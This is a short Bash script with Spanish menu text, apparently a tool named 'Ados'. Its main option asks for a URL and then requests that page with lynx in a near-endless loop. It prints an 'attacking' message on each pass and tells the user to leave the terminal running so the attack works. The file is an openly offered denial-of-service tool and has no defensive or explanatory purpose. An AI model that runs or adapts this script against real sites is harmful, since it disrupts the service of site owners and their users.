bash .banner
echo "Introduce la opcion que deseas realizar:"
echo ""
echo "1)Dos a una pagina"
echo "2)Ayuda"
echo "3)Salir"
echo ""
read num

if [ "$num" = "1" ]; then
bash .banner
echo "Introduce la url a la que haras Dos:"
read url
bash .banner
echo "Deja la terminal funcionando para que el ataque sea"
echo "efectivo. Para terminar preciona CTRL+C"
echo ""
CONTADOR=0
fin=999999999
while [  $CONTADOR -lt $fin ]; do

ab=$(lynx -dump $url)

echo "Atacando a -----> $url:80 RPT: $CONTADOR"
echo ""

let CONTADOR=CONTADOR+1

done

fi

if [ "$num" = "2" ]; then
bash .banner
cat Readme.txt
echo ""
echo "Presiona una tecla para continuar..."
read pause
bash Ados.sh
fi

if [ "$num" = "3" ];then
bash .banner
echo "          Gracias por usar Ados!"
echo ""
fi
